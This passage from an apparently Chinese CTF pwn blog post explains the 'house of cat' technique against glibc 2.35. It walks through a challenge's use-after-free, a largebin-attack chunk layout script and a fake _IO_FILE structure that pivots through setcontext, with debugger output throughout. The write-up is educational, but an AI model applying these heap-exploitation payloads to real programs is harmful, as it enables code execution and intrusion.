<span class="number">19</span> times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = <span class="number">0x7f2b2d5c80d0</span> &lt;_IO_wfile_jumps+<span class="number">16</span>&gt;</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p _IO_file_jumps</span><br><span class="line">$<span class="number">8</span> = &#123;</span><br><span class="line">  __dummy = <span class="number">0</span>,</span><br><span class="line">  __dummy2 = <span class="number">0</span>,</span><br><span class="line">  __finish = <span class="number">0x7f2b2d43e070</span> &lt;_IO_new_file_finish&gt;,</span><br><span class="line">  __overflow = <span class="number">0x7f2b2d43ee40</span> &lt;_IO_new_file_overflow&gt;,</span><br><span class="line">  __underflow = <span class="number">0x7f2b2d43eb30</span> &lt;_IO_new_file_underflow&gt;,</span><br><span class="line">  __uflow = <span class="number">0x7f2b2d43fde0</span> &lt;__GI__IO_default_uflow&gt;,</span><br><span class="line">  __pbackfail = <span class="number">0x7f2b2d441300</span> &lt;__GI__IO_default_pbackfail&gt;,</span><br><span class="line">  __xsputn = <span class="number">0x7f2b2d43d680</span> &lt;_IO_new_file_xsputn&gt;,</span><br><span class="line">  __xsgetn = <span class="number">0x7f2b2d43d330</span> &lt;__GI__IO_file_xsgetn&gt;,</span><br><span class="line">  __seekoff = <span class="number">0x7f2b2d43c960</span> &lt;_IO_new_file_seekoff&gt;,</span><br><span class="line">  __seekpos = <span class="number">0x7f2b2d440530</span> &lt;_IO_default_seekpos&gt;,</span><br><span class="line">  __setbuf = <span class="number">0x7f2b2d43c620</span> &lt;_IO_new_file_setbuf&gt;,</span><br><span class="line">  __sync = <span class="number">0x7f2b2d43c4b0</span> &lt;_IO_new_file_sync&gt;,</span><br><span class="line">  __doallocate = <span class="number">0x7f2b2d430b90</span> &lt;__GI__IO_file_doallocate&gt;,</span><br><span class="line">  __read = <span class="number">0x7f2b2d43d9b0</span> &lt;__GI__IO_file_read&gt;,</span><br><span class="line">  __write = <span class="number">0x7f2b2d43cf40</span> &lt;_IO_new_file_write&gt;,</span><br><span class="line">  __seek = <span class="number">0x7f2b2d43c6f0</span> &lt;__GI__IO_file_seek&gt;,</span><br><span class="line">  __close = <span class="number">0x7f2b2d43c610</span> &lt;__GI__IO_file_close&gt;,</span><br><span class="line">  __stat = <span class="number">0x7f2b2d43cf30</span> &lt;__GI__IO_file_stat&gt;,</span><br><span class="line">  __showmanyc = <span class="number">0x7f2b2d4414a0</span> &lt;_IO_default_showmanyc&gt;,</span><br><span class="line">  __imbue = <span class="number">0x7f2b2d4414b0</span> &lt;_IO_default_imbue&gt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>我们看到这里对应的入口点就是 xsputn。当__malloc_assert 进行 __fxprintf 调用的时候，进行错误输出的时候，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">__fxprintf  ————》》</span><br><span class="line"></span><br><span class="line">locked_vfxprintf  ————》》</span><br><span class="line">__vfprintf_internal 	————》》		//0x7f6fb038d15d &lt;__vfprintf_internal+173&gt;    call   *ABS*+0xab090@plt </span><br><span class="line">__strchrnul_avx2;ret</span><br><span class="line">__libc_cleanup_push_defer;ret</span><br><span class="line">0x7f6fb038d1c8 &lt;__vfprintf_internal+280&gt;    call   qword ptr [r12 + 0x38]	//调用目标函数&lt;__GI__IO_wfile_seekoff&gt;</span><br></pre></td></tr></table></figure>
<h3 id="下面我们直接来看题目"><a class="markdownIt-Anchor" href="#下面我们直接来看题目">#</a> 下面我们直接来看题目。</h3>
<p>开始的逆向过程就不再赘述。</p>
<p>程序确实实现了增删改查的功能，但是对于改的次数做出了严格的限制，只允许进行两次更改，而且程序没有结束功能，也就是说，我们如果想利用 io 必须触发报错__malloc_assert。由于我们只有两次修改的机会，那么其实我们已经想好了怎么做，一次用来出发报错，一次用来伪造 io 结构。</p>
<p>我们来看程序的实现，</p>
<h4 id="add"><a class="markdownIt-Anchor" href="#add">#</a> add</h4>
<p>在创建的 chunk 的时候，最多允许我们创建 16 个 cat，并且对 size 的大小进行了限制</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">size &lt;= <span class="number">0x417</span> || size &gt; <span class="number">0x46F</span></span><br></pre></td></tr></table></figure>
<p>只允许的 largebin 范围的堆块的创建</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 idx; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  writen(<span class="string">&quot;plz input your cat idx:\n&quot;</span>);</span><br><span class="line">  idx = getint();</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">0xF</span> || <span class="built_in">list</span>[idx] )</span><br><span class="line">  &#123;</span><br><span class="line">    writen(<span class="string">&quot;invalid!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    writen(<span class="string">&quot;plz input your cat size:\n&quot;</span>);</span><br><span class="line">    size = getint();</span><br><span class="line">    <span class="keyword">if</span> ( size &lt;= <span class="number">0x417</span> || size &gt; <span class="number">0x46F</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      writen(<span class="string">&quot;invalid size!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">list</span>[idx] = <span class="built_in">calloc</span>(<span class="number">1uLL</span>, size);</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">list</span>[idx] )</span><br><span class="line">      &#123;</span><br><span class="line">        size_list[idx] = size;</span><br><span class="line">        writen(<span class="string">&quot;plz input your content:\n&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, <span class="built_in">list</span>[idx], size_list[idx]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        writen(<span class="string">&quot;error!\n&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同时，因为使用 了 calloc 函数，会对我们申请出来的 chunk 进行一个初始化。read 允许我们输入空字符。</p>
<p>接下来我们看看删除</p>
<h4 id="delete"><a class="markdownIt-Anchor" href="#delete">#</a> delete</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v0; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  writen(<span class="string">&quot;plz input your cat idx:\n&quot;</span>);</span><br><span class="line">  v0 = getint();</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt;= <span class="number">0xF</span> &amp;&amp; <span class="built_in">list</span>[v0] )</span><br><span class="line">    <span class="built_in">free</span>(<span class="built_in">list</span>[v0]);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    writen(<span class="string">&quot;invalid!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>明显的一个 uaf，可以用来泄露数据。</p>
<p>所以我们在看下 show</p>
<h4 id="show"><a class="markdownIt-Anchor" href="#show">#</a> show</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v0; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  writen(<span class="string">&quot;plz input your cat idx:\n&quot;</span>);</span><br><span class="line">  v0 = getint();</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt;= <span class="number">0xF</span> &amp;&amp; <span class="built_in">list</span>[v0] )</span><br><span class="line">  &#123;</span><br><span class="line">    writen(<span class="string">&quot;Context:\n&quot;</span>);</span><br><span class="line">    write(<span class="number">1</span>, <span class="built_in">list</span>[v0], <span class="number">0x30</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    writen(<span class="string">&quot;invalid!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用 write，允许输出空字符，最多输出 0x30 字节，这已经够了，我们只要释放两个不相连的 chunk 就可以实现两地址的泄露，但是，这里要注意到，这个 uaf 的负面影响就是，我们不可以再向对应的 idx 申请 chunk，所以我们要控制数量。</p>
<h4 id="攻击"><a class="markdownIt-Anchor" href="#攻击">#</a> 攻击</h4>
<p>简单的布局下 chunk，泄露出两个地址， 然后准备进行 largebinattack</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x450</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)     <span class="comment">#0</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x418</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)     <span class="comment">#1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x430</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)     <span class="comment">#2</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x418</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)     <span class="comment">#3</span></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x440</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)     <span class="comment">#4</span></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x418</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>)  <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x460</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>)  <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>chunk 的情况</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x5609eb575000</span></span><br><span class="line">Size: <span class="number">0x291</span></span><br><span class="line"></span><br><span class="line">Free <span class="title function_">chunk</span> <span class="params">(largebins)</span> | PREV_INUSE</span><br><span class="line">Addr: 0x5609eb575290</span><br><span class="line">Size: 0x451</span><br><span class="line">fd: 0x7f2adf8f70e0</span><br><span class="line">bk: 0x5609eb575b00</span><br><span class="line">fd_nextsize: 0x5609eb575b00</span><br><span class="line">bk_nextsize: 0x5609eb575b00</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5609eb5756e0</span><br><span class="line">Size: 0x420</span><br><span class="line"></span><br><span class="line">Free <span class="title function_">chunk</span> <span class="params">(largebins)</span> | PREV_INUSE</span><br><span class="line">Addr: 0x5609eb575b00</span><br><span class="line">Size: 0x461</span><br><span class="line">fd: 0x5609eb575290</span><br><span class="line">bk: 0x7f2adf8f70e0</span><br><span class="line">fd_nextsize: 0x5609eb575290</span><br><span class="line">bk_nextsize: 0x5609eb575290</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5609eb575f60</span><br><span class="line">Size: 0x420</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5609eb576380</span><br><span class="line">Size: 0x441</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5609eb5767c0</span><br><span class="line">Size: 0x471</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5609eb576c30</span><br><span class="line">Size: 0x1f3d1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>接下来就是获取到_IO_list_all 的位置，然后进行伪造 iofile</p>
<p>伪造的模板，作者已经提供了，这里是用到了 setcontext 进行参数的设置，我们需要手动更改下 fake_io_addr 的地址为我们控制的 chunk 地址，这里就是 largebin attack 生效的攻击地址。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">fake_io_addr=heapbase+<span class="number">0xb00</span></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">0</span>)<span class="comment">#</span></span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0xb0</span>)<span class="comment">#_IO_backup_base=setcontext_rdx</span></span><br><span class="line">fake_IO_FILE +=p64(setcontext+<span class="number">61</span>)<span class="comment">#_IO_save_end=call addr(call setcontext)</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heapbase+<span class="number">0x1000</span>)  <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0x30</span>)<span class="comment">#_wide_data,rax1_addr</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libcbase+<span class="number">0x2160c0</span>+<span class="number">0x10</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  <span class="comment"># rax2_addr</span></span><br></pre></td></tr></table></figure>
<p>伪造好后的_io_file</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;_IO_list_all</span><br><span class="line">$<span class="number">1</span> = (<span class="keyword">struct</span> _IO_FILE_plus **) <span class="number">0x7f85fb7ee680</span> &lt;_IO_list_all&gt;</span><br><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> _IO_FILE_plus **) <span class="number">0x7f85fb7ee680</span> </span><br><span class="line">$<span class="number">2</span> = (<span class="keyword">struct</span> _IO_FILE_plus *) <span class="number">0x563e47a6c370</span></span><br><span class="line">pwndbg&gt; p*(<span class="keyword">struct</span> _IO_FILE_plus *) <span class="number">0x563e47a6c370</span></span><br><span class="line">$<span class="number">3</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">0</span>,</span><br><span class="line">    _IO_read_ptr = <span class="number">0x451</span> &lt;error: Cannot access memory at address <span class="number">0x451</span>&gt;,</span><br><span class="line">    _IO_read_end = <span class="number">0x7f85fb7ee0e0</span> &lt;main_arena+<span class="number">1120</span>&gt; <span class="string">&quot;\320\340~\373\205\177&quot;</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x563e47a6b290</span> <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x563e47a6b290</span> <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x7f85fb7ee660</span> &lt;_nl_global_locale+<span class="number">224</span>&gt; <span class="string">&quot;\327\341z\373\205\177&quot;</span>,</span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_end = <span class="number">0x1</span> &lt;error: Cannot access memory at address <span class="number">0x1</span>&gt;,</span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_backup_base = <span class="number">0x563e47a6c420</span> <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_save_end = <span class="number">0x7f85fb627a6d</span> &lt;setcontext+<span class="number">61</span>&gt; <span class="string">&quot;H\213\242\240&quot;</span>,</span><br><span class="line">    _markers = <span class="number">0x0</span>,</span><br><span class="line">    _chain = <span class="number">0x0</span>,</span><br><span class="line">    _fileno = <span class="number">0</span>,</span><br><span class="line">    _flags2 = <span class="number">0</span>,</span><br><span class="line">    _old_offset = <span class="number">0</span>,</span><br><span class="line">    _cur_column = <span class="number">0</span>,</span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>,</span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _lock = <span class="number">0x563e47a6c000</span>,</span><br><span class="line">    _offset = <span class="number">0</span>,</span><br><span class="line">    _codecvt = <span class="number">0x0</span>,</span><br><span class="line">    _wide_data = <span class="number">0x563e47a6c3a0</span>,</span><br><span class="line">    _freeres_list = <span class="number">0x0</span>,</span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>,</span><br><span class="line">    __pad5 = <span class="number">0</span>,</span><br><span class="line">    _mode = <span class="number">0</span>,</span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = <span class="number">0x7f85fb7ea0e0</span> &lt;_IO_wfile_jumps+<span class="number">32</span>&gt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>接下来就是如何触发 exit，利用__malloc_assert 报错，这里可以修改 topchunk 的 size 进行报错。这里依旧可以选择进行 largebin attack. 文章最开始有介绍如何进行连续的两次 attack 。</p>

      <div class="tags">
          <a href="/tags/pwn/" rel="tag"><i class="ic i-tag"></i> pwn</a>
      </div>
  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">Edited on</span>
    <time title="Modified: 2022-08-24 18:32:45" itemprop="dateModified" datetime="2022-08-24T18:32:45+08:00">2022-08-24</time>
  </span>
</div>

      
<div class="reward">
  <button><i class="ic i-heartbeat"></i> Donate</button>
  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
  <div id="qr">
      
      <div>
        <img data-src="/images/wechatpay.png" alt="dreamcat WeChat Pay">
        <p>WeChat Pay</p>
      </div>
      
      <div>
        <img data-src="/images/alipay.png" alt="dreamcat Alipay">
        <p>Alipay</p>
      </div>
      
      <div>
        <img data-src="/images/paypal.png" alt="dreamcat PayPal">
        <p>PayPal</p>
      </div>
  </div>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>Post author:  </strong>dreamcat <i class="ic i-at"><em>@</em></i>我他喵的
  </li>
  <li class="link">
    <strong>Post link: </strong>
    <a href="http://example.com/2022/08/01/glibc-2-35%E4%B8%80%E4%BA%9B%E6%89%8B%E6%B3%95/" title="glibc-2.35一些手法">http://example.com/2022/08/01/glibc-2-35一些手法/</a>
  </li>
  <li class="license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

  <a href="/2022/07/20/360dsctf2022-eznote/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gicitf0kl1j20zk0m87fe.jpg" title="360dsctf2022_eznote">
  <span class="type">Previous Post</span>
  <span class="category"><i class="ic i-flag"></i> </span>
  <h3>360dsctf2022_eznote</h3>
  </a>

    </div>
    <div class="item right">
      

  <a href="/2022/09/20/tctf2022ezvm/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giciusoyjnj219g0u0x56.jpg" title="tctf2022ezvm">
  <span class="type">Next Post</span>
  <span class="category"><i class="ic i-flag"></i> pwn</span>
  <h3>tctf2022ezvm</h3>
  </a>

    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="Contents">
          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#glibc-235-ubuntu3-%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95"><span class="toc-number">1.</span> <span class="toc-text"> glibc 2.35 ubuntu3 下的利用手法。</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%B0%E7%8A%B6"><span class="toc-number">1.1.</span> <span class="toc-text"> 现状：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%80%BB%E7%BB%93"><span class="toc-number">1.2.</span> <span class="toc-text"> 一些小总结：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#largebinattack"><span class="toc-number">1.3.</span> <span class="toc-text"> largebinattack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A6%81%E6%B1%82"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 要求</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#setcontext"><span class="toc-number">1.4.</span> <span class="toc-text"> setcontext</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tls%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C%E6%B5%81"><span class="toc-number">1.5.</span> <span class="toc-text"> tls 劫持 exit 执行流</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.5.1.</span> <span class="toc-text"> 前提条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E6%88%91%E4%BB%AC%E4%BB%A5360dsctf%E7%9A%84eznote%E4%B8%BA%E4%BE%8B%E9%A2%98"><span class="toc-number">1.5.2.</span> <span class="toc-text"> 这里我们以 360dsctf 的 eznote 为例题，</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-cat"><span class="toc-number">1.6.</span> <span class="toc-text"> house of cat</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.6.1.</span> <span class="toc-text"> 利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98"><span class="toc-number">1.6.2.</span> <span class="toc-text"> 问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8B%E9%9D%A2%E6%88%91%E4%BB%AC%E7%9B%B4%E6%8E%A5%E6%9D%A5%E7%9C%8B%E9%A2%98%E7%9B%AE"><span class="toc-number">1.6.3.</span> <span class="toc-text"> 下面我们直接来看题目。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#add"><span class="toc-number">1.6.3.1.</span> <span class="toc-text"> add</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#delete"><span class="toc-number">1.6.3.2.</span> <span class="toc-text"> delete</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#show"><span class="toc-number">1.6.3.3.</span> <span class="toc-text"> show</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB"><span class="toc-number">1.6.3.4.</span> <span class="toc-text"> 攻击</span></a></li></ol></li></ol></li></ol></li></ol>
      </div>
      <div class="related panel pjax" data-title="Related">
      </div>
      <div class="overview panel" data-title="Overview">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt="dreamcat"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">dreamcat</p>
  <div class="description" itemprop="description"></div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">32</span>
        <span class="name">posts</span>
      </a>
    </div>
    <div class="item categories">
      <a href="/categories/">
        <span class="count">4</span>
        <span class="name">categories</span>
      </a>
    </div>
    <div class="item tags">
      <a href="/tags/">
        <span class="count">8</span>
        <span class="name">tags</span>
      </a>
    </div>
</nav>

<div class="social">
</div>

<ul class="menu">
  
    
  <li class="item">
